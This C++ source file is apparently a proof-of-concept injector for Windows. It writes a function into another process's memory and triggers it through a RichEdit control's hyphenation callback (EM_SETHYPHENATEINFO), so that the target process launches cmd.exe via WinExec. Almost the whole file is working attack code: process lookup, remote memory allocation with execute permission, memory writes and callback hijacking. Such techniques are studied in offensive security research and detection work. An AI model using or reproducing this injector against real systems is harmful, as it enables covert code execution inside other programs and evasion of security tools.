// HyphenateProc_Injection.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include "Commctrl.h"
#include <string>
#include <iostream>
#include <tlhelp32.h>
#include <strsafe.h>
#include <ntstatus.h>
#include <Richedit.h>


//core idea for the function injection taken from: http://www.rohitab.com/discuss/topic/39357-code-cave-injection-tutorial-c/

#pragma pack(push,1) //have to pack structures, the SHORT in myHyphenateInfo enlarged to DWORD by VS and it would crash the application

//this is a definition for WinExec, taken from MSDN
//required so it can be called from the injected function
typedef int(WINAPI* myWinExec)(
	LPCSTR lpCmdLine,
	UINT   uCmdShow
	);

//all data parameters that will be needed by the injected function, e.g.: function names, parameters, etc...
struct PARAMETERS {
	SIZE_T FuncInj;
	char command[256];
};

typedef struct myHyphenateInfo {
	SHORT cbSize;
	SHORT dxHyphenateZone;
	SIZE_T pfnHyphenate;
};
#pragma pack(pop)

/*
https://docs.microsoft.com/en-us/windows/desktop/api/richedit/nf-richedit-hyphenateproc
void HyphenateProc(
WCHAR      *pszWord,
LANGID     langid,
long       ichExceed,
HYPHRESULT *phyphresult
);
*/
//this is the to be injected function, the parameters reflect HyphenateProc
void ToBeInjected(WCHAR *pszWord, LANGID langid, long ichExceed, HYPHRESULT *phyphresult)
{
#ifdef _WIN64	
	PARAMETERS * myparam = (PARAMETERS *)0x0000440000000000; 	//parameters will be placed in fixed location
#endif
#ifdef _X86_	
	PARAMETERS * myparam = (PARAMETERS *)0x44000000; 	//parameters will be placed in fixed location
#endif
	myWinExec WE = (myWinExec)myparam->FuncInj; //we get the WinExec address and convert it to a function
	WE(myparam->command, 1); //call the function
	return; 
}

DWORD Useless() {      //this is useless to our injection but is needed to calculate the length of MyFunc
	return 0;
}

//this is a structure to store injection related info, PID and function address
typedef struct INJECTINFO
{
	DWORD pid;
	LPVOID address;
} *LPINJECTINFO;

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, (wchar_t *)lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

DWORD FindPIDByName(LPWSTR pName)
{
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}
	if (Process32First(snapshot, &pEntry) == TRUE)
	{
		while (Process32Next(snapshot, &pEntry) == TRUE)
		{
			if (NULL != wcsstr(pEntry.szExeFile, pName))
			{
				return pEntry.th32ProcessID;
			}
		}
		ErrorExit(TEXT("Process32Next"));
	}
	else
	{
		ErrorExit(TEXT("Process32First"));
	}

	CloseHandle(snapshot);
	return 0;
}

int GetFunctionAddressFromDll(PSTR pszDllName, PSTR pszFunctionName, PVOID *ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		ErrorExit(TEXT("GetModuleHandleA"));
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		ErrorExit(TEXT("GetProcAddress"));
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return STATUS_SUCCESS;
}


void print_window_info(HWND hwnd)
{
	//get the window title
	int length = GetWindowTextLength(hwnd);
	char* buffer = new char[length + 1];
	GetWindowTextA(hwnd, buffer, length + 1);
	std::string windowTitle(buffer);
	//get the window class name
	char* buffer_class_name = new char[MAX_PATH + 1];
	GetClassNameA(hwnd, buffer_class_name, MAX_PATH + 1);
	std::string windowClass(buffer_class_name);

	//print out
	std::cout << hwnd << ":  " << windowTitle << std::endl;
	std::cout << hwnd << ":  " << windowClass << std::endl;
}

LPVOID copy_structure_to_target(DWORD pid, myHyphenateInfo hi)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		ErrorExit(TEXT("OpenProcess"));
	}
	else
	{
		printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);
	}
	// Allocate memory in target process for the to be injected function
	printf("[*] Allocating memory for HYPHENATEINFO structure in target process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(myHyphenateInfo), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}

	printf("[+] Memory allocated at: 0x%Ix\n", (SIZE_T)lpBaseAddress);

	SIZE_T *lpNumberOfBytesWritten = 0;

	//write our function to the target process
	BOOL resWPM;
	printf("[*] Writing HYPHENATEINFO structure to target process\n");
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)&hi, sizeof(myHyphenateInfo), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote HYPHENATEINFO structure to target process\n");
	return lpBaseAddress;
}

//the actual injector function
void inject_HyphenateProc(LPINJECTINFO ii, HWND hwnd)
{
	DWORD dwProcessID = 0;
	GetWindowThreadProcessId(hwnd, &dwProcessID); //get the PID for the window
	if (dwProcessID == ii->pid) //if it matches the pid where we want to inject
	{
		print_window_info(hwnd); //just printf debugging :)
		DWORD res;
		/*
		The structure to be populated:
		typedef struct tagHyphenateInfo {
		SHORT cbSize;
		SHORT dxHyphenateZone;
		void((WCHAR *,LANGID, long,HYPHRESULT *) * )pfnHyphenate;
		} HYPHENATEINFO;
		*/

		/*
		this message will enable the feature for us
		To enable hyphenation, the client must call EM_SETTYPOGRAPHYOPTIONS, specifying TO_ADVANCEDTYPOGRAPHY.
		https://docs.microsoft.com/en-us/windows/desktop/Controls/em-sethyphenateinfo
		*/
		res = SendMessage(hwnd, EM_SETTYPOGRAPHYOPTIONS, (WPARAM)TO_ADVANCEDTYPOGRAPHY, (LPARAM)TO_ADVANCEDTYPOGRAPHY);
		printf("[+] SendMessage result: 0x%x\n", (UINT)res); //debug result
		if (res != 0) //if successful it is non-zero, this allows us to filter down to RICHEDIT controls
		{
			//create myHyphenateInfo structure
			myHyphenateInfo hi;
			hi.cbSize = sizeof(myHyphenateInfo);
			hi.dxHyphenateZone = 0;
			hi.pfnHyphenate = (SIZE_T)(ii->address);

			//need to copy the HYPHENATEINFO structure to the target
			LPVOID hi_address = copy_structure_to_target(ii->pid, hi);
			res = SendMessage(hwnd, EM_SETHYPHENATEINFO, (WPARAM)hi_address, NULL); //injection!!!
			printf("[+] SendMessage result: 0x%x\n", (UINT)res); //debug result

			//trigger by typing
		}
	}
}

//callback function for the Child window enumeration, lparam contains the injection info
static BOOL CALLBACK enumChildWindowCallback(HWND hwnd, LPARAM lparam)
{
	//print_window_info(hWnd);
	inject_HyphenateProc((LPINJECTINFO)lparam, hwnd);
	//return TRUE so the enumeration doesn't stop
	return TRUE;
}

//callback function for the main window enumeration, lparam contains the injection info
static BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lparam)
{
	//print_window_info(hWnd);
	EnumChildWindows(hWnd, enumChildWindowCallback, lparam);
	//return TRUE so the enumeration doesn't stop
	return TRUE;
}



int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 2)
	{
		printf("Usage: inject.exe [process name]\n");
		return 1;
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		ErrorExit(TEXT("OpenProcess"));
	}
	else
	{
		printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);
	}

	// Allocate memory in target process for the to be injected function
	printf("[*] Allocating memory for shellcode in process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}

	printf("[+] Memory allocated at: 0x%Ix\n", (SIZE_T)lpBaseAddress);

	SIZE_T *lpNumberOfBytesWritten = 0;

	//setup parameters struct
	char * command = "cmd.exe";
	PARAMETERS data;
	data.FuncInj = (SIZE_T)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
	strcpy_s(data.command, command);

	//calculate our inejtec function size
	SIZE_T size_myFunc = (SIZE_T)Useless - (SIZE_T)ToBeInjected;

	//write our function to the target process
	BOOL resWPM;
	printf("[*] Writing shellcode to process\n");
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)ToBeInjected, size_myFunc, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote shellcode to target process\n");

	//allocate memory in the target for the PARAMETERS on a fixed address
	printf("[*] Allocating memory for PARAMETERS in process\n");
#ifdef _WIN64	
	SIZE_T param_address = 0x0000440000000000;
#endif
#ifdef _X86_	
	SIZE_T param_address = 0x44000000;
#endif
	LPVOID DataAddress = VirtualAllocEx(hProcess, (LPVOID)param_address, sizeof(PARAMETERS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[*] Writing PARAMETERS to process\n");
	resWPM = WriteProcessMemory(hProcess, DataAddress, &data, sizeof(PARAMETERS), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}

	printf("[+] Shellcode is written to memory\n");

	std::cout << "Enmumerating windows..." << std::endl;

	//setup injection info
	INJECTINFO ii;
	ii.address = lpBaseAddress; //lpBaseAddress contains our shellcode
	ii.pid = pid;
	EnumWindows(enumWindowCallback, (LPARAM)(&ii));

	return 0;
}

